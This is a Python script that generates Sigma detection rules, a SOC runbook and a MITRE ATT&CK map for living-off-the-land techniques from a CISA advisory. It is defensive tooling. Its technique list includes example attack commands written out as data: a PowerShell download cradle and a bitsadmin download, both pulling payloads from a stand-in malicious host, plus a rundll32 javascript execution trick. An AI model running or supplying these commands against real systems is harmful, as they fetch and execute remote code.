#!/usr/bin/env python3
import os
from datetime import datetime

REPORT_NAME = "Living Off the Land Attack"
REPORT_SOURCE = "CISA AA23-136A"
REPORT_DATE = datetime.now().strftime("%Y-%m-%d")

TECHNIQUES = [
    {
        "name": "PowerShell with Encoded Commands",
        "mitre_id": "T1059.001",
        "tactic": "Execution",
        "what_to_detect": "powershell.exe with -EncodedCommand flag"
    },
    {
        "name": "WMI Lateral Movement",
        "mitre_id": "T1047",
        "tactic": "Lateral Movement",
        "what_to_detect": "wmiprvse.exe spawning cmd.exe"
    },
    {
        "name": "Scheduled Tasks for Persistence",
        "mitre_id": "T1053.005",
        "tactic": "Persistence",
        "what_to_detect": "schtasks.exe creating new tasks"
    },
    {
        "name": "PowerShell Download Cradle",
        "mitre_id": "T1059.001",
        "tactic": "Execution",
        "what_to_detect": "powershell.exe with Invoke-Expression and DownloadString",
        "command": "IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
    },
    {
        "name": "WMI Event Subscription",
        "mitre_id": "T1546.003",
        "tactic": "Persistence",
        "what_to_detect": "Register-WmiEvent or __FilterToConsumerBinding",
        "command": "Register-WmiEvent -Query 'SELECT * FROM __InstanceModificationEvent'"
    },
    {
        "name": "BITSAdmin Download",
        "mitre_id": "T1197",
        "tactic": "Defense Evasion",
        "what_to_detect": "bitsadmin.exe /transfer /download",
        "command": "bitsadmin /transfer job /download http://malicious.com/payload.exe C:\\temp\\payload.exe"
    },
    {
        "name": "Rundll32 Execution",
        "mitre_id": "T1218.011",
        "tactic": "Defense Evasion",
        "what_to_detect": "rundll32.exe executing .dll or .cpl files",
        "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";alert('malware')"
    }
]

def save_rule(content, filename):
    os.makedirs("rules", exist_ok=True)
    with open(os.path.join("rules", filename), 'w') as f:
        f.write(content)
    print(f"  [OK] rules/{filename}")

def create_powershell_rule():
    return f'''title: Detection: PowerShell with Encoded Commands
status: experimental
references: [{REPORT_SOURCE}]
date: {REPORT_DATE}
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains: '-EncodedCommand'
    condition: selection
level: high
'''

def create_wmi_rule():
    return f'''title: Detection: WMI Lateral Movement
status: experimental
references: [{REPORT_SOURCE}]
date: {REPORT_DATE}
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        ParentImage|endswith: '\\wmiprvse.exe'
        Image|endswith: '\\cmd.exe'
    condition: selection
level: high
'''

def create_schtasks_rule():
    return f'''title: Detection: Scheduled Task Creation
status: experimental
references: [{REPORT_SOURCE}]
date: {REPORT_DATE}
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\\schtasks.exe'
        CommandLine|contains: '/create'
    condition: selection
level: medium
'''

def create_soc_runbook():
    content = f"# SOC Runbook\n\n## Techniques\n\n"
    for tech in TECHNIQUES:
        content += f"- {tech['name']} ({tech['mitre_id']}): {tech['what_to_detect']}\n"
    os.makedirs("output", exist_ok=True)
    with open("output/soc_runbook.md", 'w') as f:
        f.write(content)
    print(f"  [OK] output/soc_runbook.md")

def create_mitre_map():
    template_path = "templates/mitre_map.html"
    
    if not os.path.exists(template_path):
        # Fallback
        html = f"<html><body><h1>MITRE Map</h1><p>Report: {REPORT_NAME}</p><p>Techniques: {len(TECHNIQUES)}</p><ul>"
        for tech in TECHNIQUES:
            html += f"<li>{tech['mitre_id']} - {tech['name']}</li>"
        html += "</ul></body></html>"
    else:
        with open(template_path, 'r') as f:
            html = f.read()
        html = html.replace("{{ REPORT_NAME }}", REPORT_NAME)
        html = html.replace("{{ REPORT_SOURCE }}", REPORT_SOURCE)
        html = html.replace("{{ REPORT_DATE }}", REPORT_DATE)
        html = html.replace("{{ TECHNIQUES_COUNT }}", str(len(TECHNIQUES)))
        
        techniques_html = ""
        for tech in TECHNIQUES:
            techniques_html += f'<div class="technique-card"><div class="technique-id">{tech["mitre_id"]}</div><div class="technique-name">{tech["name"]}</div><div class="technique-tactic">{tech["tactic"]}</div><div class="technique-detect">{tech["what_to_detect"]}</div></div>'
        html = html.replace("{{ TECHNIQUES_LIST }}", techniques_html)
    
    with open("output/mitre_map.html", 'w') as f:
        f.write(html)
    print(f"  [OK] output/mitre_map.html")

def main():
    print("\n" + "=" * 50)
    print("SIGMA RULE GENERATOR")
    print("=" * 50)
    
    print("\n[1] Creating Sigma rules...")
    save_rule(create_powershell_rule(), "rule_powershell.yml")
    save_rule(create_wmi_rule(), "rule_wmi.yml")
    save_rule(create_schtasks_rule(), "rule_schtasks.yml")
    
    print("\n[2] Creating SOC runbook...")
    create_soc_runbook()
    
    print("\n[3] Creating MITRE map...")
    create_mitre_map()
    
    print("\n" + "=" * 50)
    print("DONE!")
    print("=" * 50)

if __name__ == "__main__":
    main()